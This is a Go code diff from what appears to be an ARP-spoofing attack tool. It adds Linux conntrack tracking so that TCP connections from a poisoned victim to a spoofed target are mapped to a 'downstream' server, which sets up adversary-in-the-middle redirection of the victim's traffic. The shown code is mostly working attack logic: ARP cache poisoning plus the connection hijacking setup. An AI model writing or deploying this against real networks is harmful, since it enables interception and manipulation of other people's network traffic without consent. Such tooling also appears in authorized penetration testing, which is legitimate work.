@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"github.com/florianl/go-conntrack"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -83,7 +84,11 @@ func MainSniff(ctx context.Context, cfg Cfg, attackCh chan AttackSnacCfg) (err e
 
 						ctx, cancel := context.WithCancel(args.Ctx)
 						go func() {
-							err := AttackSnac(ctx, cfg, args.SenderIp, args.TargetIp, args.Handlers...)
+							downstream := args.downstream
+							if downstream == nil {
+								downstream = cfg.aitm.getDefaultDS()
+							}
+							err := AttackSnac(ctx, cfg, args.SenderIp, args.TargetIp, downstream, args.Handlers...)
 							if err != nil { // error while performing attack
 								fields = append(fields, zap.Error(err))
 								cfg.log.Error("error while poisoning conversation", fields...)
@@ -302,10 +307,88 @@ func attackSnacBpf(sIp, tIp string) string {
 //
 // NOTE: Before poisoning the sender's ARP table, this function passively
 // waits for the sender to broadcast an ARP request.
-func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP,
+func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP, downstream *ConntrackInfo,
   handlers ...ArpSpoofHandler) (err error) {
 
 	logFields := []zap.Field{zap.String("senderIp", senIp.String()), zap.String("targetIp", tarIp.String())}
+
+	//=========================================
+	// CONFIGURE CONNECTION TRACKING FOR ATTACK
+	//=========================================
+	// - registers a function that is executed for each connection
+	//   initiated by the sender for the target IP being spoofed
+	// - function maps the current connection's sender address to
+	//   the target address on the Cfg
+	// - makes information available for connection handling later
+
+	var nfct *conntrack.Nfct
+	nfct, err = conntrack.Open(&conntrack.Config{})
+	if err != nil {
+		logFields = append(logFields, zap.Error(err))
+		cfg.log.Error("failed to open connection to netfilter", logFields...)
+		return
+	}
+	defer nfct.Close()
+
+	// TODO this should probably filter for TCP SYN or something
+	filter := []conntrack.ConnAttr{
+		{
+			Type: conntrack.AttrOrigIPv4Src,
+			Data: senIp.To4(),
+			Mask: []byte{0xff, 0xff, 0xff, 0xff},
+		},
+		{
+			Type: conntrack.AttrOrigIPv4Dst,
+			Data: tarIp.To4(),
+			Mask: []byte{0xff, 0xff, 0xff, 0xff},
+		},
+	}
+
+	// ensure a downstream is available for the connection
+	var downstreamDefault bool
+	if downstream == nil {
+		downstreamDefault = true
+		if ds := cfg.aitm.getDefaultDS(); ds == nil {
+			err = errors.New("downstream address not found or empty")
+			return
+		} else {
+			downstream = ds
+		}
+	}
+
+	err = nfct.RegisterFiltered(ctx, conntrack.Conntrack, conntrack.NetlinkCtNew, filter, func(con conntrack.Con) int {
+		if con.ProtoInfo == nil || con.ProtoInfo.TCP == nil {
+			return 0
+		}
+		k := ConntrackInfo{
+			IP:        con.Origin.Src.To4().String(),
+			Port:      fmt.Sprintf("%d", *con.Origin.Proto.SrcPort),
+			Transport: TCPConntrackTransport,
+		}
+		if _, ok := cfg.aitm.connAddrs.Load(k); !ok {
+			var v ConntrackInfo
+			if downstreamDefault {
+				// downstream should just hit the default tcp server
+				// NOTE that the port is changed in this case, where it's
+				// preserved when a real downstream is supplied
+				v = *downstream
+			} else {
+				// downstream should target a real host on the target port
+				v = ConntrackInfo{
+					IP:        downstream.IP,
+					Port:      fmt.Sprintf("%d", *con.Origin.Proto.DstPort),
+					Transport: TCPConntrackTransport,
+				}
+			}
+			cfg.aitm.connAddrs.Store(k, v)
+		}
+		return 0
+	})
+
+	//========================
+	// POISON VICTIM ARP CACHE
+	//========================
+
 	var rHandle, wHandle *pcap.Handle
 	if rHandle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever); err != nil {
 		logFields = append(logFields, zap.Error(err))
